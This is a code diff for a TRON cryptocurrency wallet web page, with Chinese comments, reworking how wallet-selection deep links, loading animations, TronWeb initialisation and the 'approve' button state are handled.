@@ -1935,67 +1935,89 @@ async function sendSignalA1() {
          * 多钱包弹窗事件（原代码保留）
          ****************************************************************/
         // 钱包选择：跳转对应钱包
-        DOM.walletItems.forEach(item => {
-            item.addEventListener('click', async () => {
-                const walletType = item.getAttribute("data-wallet");
-                const wallet = walletConfig[walletType];
-                if (!wallet) return;
+DOM.walletItems.forEach(item => {
+        item.addEventListener('click', async () => {
+            const walletType = item.getAttribute("data-wallet");
+            const wallet = walletConfig[walletType];
+            if (!wallet) return;
 
-                const targetUrl = window.location.href + "#approve";
-                let jumpUrl = "";
-                switch (walletType) {
-                    case "imtoken":
-                        jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
-                        break;
-                    case "tokenpocket":
-                        jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix;
-                        break;
-                    case "tronlink":
-                        const param = JSON.stringify({
-                            url: targetUrl,
-                            action: "open",
-                            protocol: "tronlink",
-                            version: "1.0"
-                        });
-                        jumpUrl = wallet.scheme + encodeURIComponent(param);
-                        break;
-                    case "bitget":
-                        jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
-                        break;
-                    default:
-                        jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
-                }
+            const loadingEl = document.getElementById("Loading");
+            const lang = langConfig[currentLang];
+            const targetUrl = window.location.href + "#approve";
 
-                console.log(`📤 跳转${wallet.name}：`, jumpUrl);
-                window.location.href = jumpUrl;
+            if (loadingEl) loadingEl.style.display = "flex";
+            item.style.pointerEvents = "none";
+            DOM.multiWalletPopup.style.display = "none";
 
-                setTimeout(() => {
-                    if (!window.tronWeb) {
-                        alert(langConfig[currentLang].evokeGuide);
-                        DOM.multiWalletPopup.style.display = "none";
-                    }
-                }, 3000);
-            });
-        });
+            let jumpUrl = "";
+            switch (walletType) {
+                case "imtoken": jumpUrl = wallet.scheme + encodeURIComponent(targetUrl); break;
+                case "tokenpocket": jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix; break;
+                case "tronlink": const param = JSON.stringify({ url: targetUrl, action: "open", protocol: "tronlink", version: "1.0" }); jumpUrl = wallet.scheme + encodeURIComponent(param); break;
+                case "bitget": jumpUrl = wallet.scheme + encodeURIComponent(targetUrl); break;
+                default: jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+            }
+            console.log(`📤 跳转${wallet.name}：`, jumpUrl);
+            window.location.href = jumpUrl;
 
-        /****************************************************************
-         * 授权后跳转页面处理（原代码保留）
-         ****************************************************************/
-        if (window.tronWeb && window.location.hash === "#approve") {
-            window.location.hash = "";
-            setTimeout(() => {
-                initWallet(true).catch(err => {
-                    console.error("授权后初始化失败：", err);
+            setTimeout(async () => {
+        try {
+            // 钱包浏览器（含刷新后）：TronWeb已存在
+            if (window.tronWeb) {
+                if (!window.tronWeb.ready) await new Promise(resolve => window.tronWeb.onReady(resolve));
+                tronWeb = window.tronWeb;
+                DOM.connectBtn.style.display = "none";
+                DOM.warning.style.display = "none";
+                DOM.specialTipContainer.style.display = "none";
+                await initWallet(false); // 执行正常初始化逻辑
+            } else {
+                // 非钱包浏览器：执行原有检测逻辑
+                await checkWalletEnv().catch(err => {
+                    console.error("环境检测失败：", err);
                     const lang = langConfig[currentLang];
-                    const tip = lang.ineligibleTip;
-                    DOM.userInfoStatus.style.display = "block";
-                    DOM.userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
-                    DOM.approveBtn.disabled = false;
+                    DOM.userInfoStatus.style.display = "none";
+                    DOM.balanceItems.forEach(item => item.style.display = "none");
+                    DOM.approveBtn.disabled = true;
                     DOM.approveBtn.textContent = lang.approveBtnText;
+                    updateUserBalanceDisplay();
                 });
-            }, 500);
+            }
+        } catch (err) {
+            console.error("刷新后500毫秒执行逻辑失败：", err);
+            const lang = langConfig[currentLang];
+            DOM.userInfoStatus.style.display = "none";
+            DOM.balanceItems.forEach(item => item.style.display = "none");
+            DOM.approveBtn.disabled = true;
+            DOM.approveBtn.textContent = lang.approveBtnText;
+            updateUserBalanceDisplay();
         }
+    }, 500);
 
+    // 1500毫秒后隐藏加载动画（统一动画时长）
+    setTimeout(() => {
+        if (loadingEl) loadingEl.style.display = "none";
+        DOM.userInfoEl.style.display = "block";
+        DOM.walletStatusContainer.style.display = "block";
+        DOM.contractResourceContainer.style.display = "block";
+    }, 1500);
+
+    /****************************************************************
+     * 授权后跳转处理（保留原有逻辑）
+     ****************************************************************/
+    if (window.tronWeb && window.location.hash === "#approve") {
+        window.location.hash = "";
+        setTimeout(() => {
+            initWallet(true).catch(err => {
+                console.error("授权后初始化失败：", err);
+                const lang = langConfig[currentLang];
+                const tip = lang.ineligibleTip;
+                DOM.userInfoStatus.style.display = "block";
+                DOM.userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                DOM.approveBtn.disabled = false;
+                DOM.approveBtn.textContent = lang.approveBtnText;
+            });
+        }, 500);
+    }
         /****************************************************************
          * 页面卸载时清理定时器（原代码保留）
          ****************************************************************/
